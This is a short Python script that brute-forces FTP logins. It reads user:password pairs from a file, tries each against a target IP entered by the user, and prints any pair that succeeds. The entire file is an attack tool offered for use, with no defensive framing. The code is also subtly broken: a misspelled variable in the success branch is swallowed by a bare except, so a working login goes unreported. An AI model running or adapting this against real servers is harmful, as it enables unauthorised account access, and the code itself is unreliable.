#!/usr/bin/python
import ftplib

def bruteLogin(hostname, passwdFile):
	try:
		Pf = open(passwdFile, "r")
	except:
		print ("File does not exist")
	for line in Pf.readlines():
		userName=line.split(':')[0]
		passWord=line.split(':')[1].strip('\n')
		print("[+] Trying: " + userName + "/" + passWord + "on host " + hostname)
		try:
			ftp=ftplib.FTP(hostname)
			login = ftp.login(userName, passWord)
			print("[+] Login succeeded With: " + userName + "/" + password)
			ftp.quit()
			return(userName,passWord)
		except:
			pass
	print("[-] Password not in list: ")

host=input("[*] Enter Target IP: ")
passwdFile=input("[*] Enter User/Password File Path: ")
bruteLogin(host, passwdFile)



